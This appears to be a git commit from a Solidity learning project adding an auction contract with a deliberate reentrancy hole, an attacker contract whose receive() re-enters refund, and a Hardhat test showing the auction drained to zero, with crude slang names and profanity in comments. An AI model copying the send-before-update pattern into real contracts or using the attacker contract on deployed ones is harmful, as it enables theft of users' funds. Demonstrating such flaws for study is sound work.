71b27e8f2fc4db2b2b88ed32e53bef401f411c98
MrNubOK <vadzim.shadryn@gmail.com>
2022-09-23 11:57:27 +0300

    Reentrency

---
+++ contracts/Reentrency.sol
@@ -0,0 +1,53 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+contract TestAutction {
+    mapping (address => uint) public bidders;
+
+    function bid() external payable {
+        bidders[msg.sender] += msg.value;
+    }
+
+    function currencyBalance() external view returns(uint) {
+        return address(this).balance;
+    }
+
+    function refund() external {
+        uint refundAmount = bidders[msg.sender];
+
+        if (refundAmount > 0) {
+            (bool success, ) = msg.sender.call{value: refundAmount}("");
+            require(success, "Transaction failed");
+            bidders[msg.sender] = 0;
+        }
+    }
+}
+
+contract MamkinHuyaker {
+    uint constant BID_AMOUNT = 1 ether;
+    TestAutction auction;
+
+    constructor(address auctionAddress) {
+        auction = TestAutction(auctionAddress);
+    } 
+
+    function currentBalance() external view returns(uint) {
+        return address(this).balance;
+    }
+
+    function proxyBid() external payable {
+        require(msg.value == BID_AMOUNT, "Incorrect bid!");
+        auction.bid{value: msg.value}();
+    } 
+
+    function mamkinHuyakerIdeUboi() external {
+        auction.refund();
+    }
+
+    receive() external payable {
+        if (auction.currencyBalance() >= BID_AMOUNT) {
+            auction.refund();
+        }
+    }
+}
---
+++ test/reentrency.test.js
@@ -0,0 +1,45 @@
+const { expect } = require("chai");
+const { ethers } = require("hardhat");
+
+describe("Reentrency test", () => {
+    let auctionOwner, bidder1, bidder2, mamkinHuyaker
+    let auction, huyakerContract
+
+    beforeEach(async function () {
+        [auctionOwner, bidder1, bidder2, mamkinHuyaker] = await ethers.getSigners()
+        const Auction = await ethers.getContractFactory("TestAutction", auctionOwner)
+        auction = await Auction.deploy()
+        await auction.deployed()
+
+        const HuyakerContract = await ethers.getContractFactory("MamkinHuyaker", mamkinHuyaker)
+        huyakerContract = await HuyakerContract.deploy(auction.address)
+        await huyakerContract.deployed()
+    })
+
+    it("Reentrency test", async function () {
+        const txBid1 = await auction.connect(bidder1).bid({value: ethers.utils.parseEther('5.0')})
+        await txBid1.wait()
+
+        const txBid2 = await auction.connect(bidder2).bid({value: ethers.utils.parseEther('9.0')})
+        await txBid2.wait()
+
+        expect(await auction.currencyBalance())
+            .to.be.eq(ethers.utils.parseEther("14.0"))
+
+        const txBid3 = await huyakerContract.connect(mamkinHuyaker).proxyBid({value: ethers.utils.parseEther('1.0')})
+        await txBid3.wait()
+
+        //All good
+        expect(await auction.currencyBalance())
+            .to.be.eq(ethers.utils.parseEther("15.0"))
+
+        //Reentrency attack
+        const refundTx = await huyakerContract.connect(mamkinHuyaker).mamkinHuyakerIdeUboi()
+        await refundTx.wait()
+        balance = await auction.currencyBalance()
+        
+        //Fuck, we'll find this piece of shit
+        expect(await auction.currencyBalance())
+            .to.be.eq(ethers.utils.parseEther("0.0"))
+    })
+})
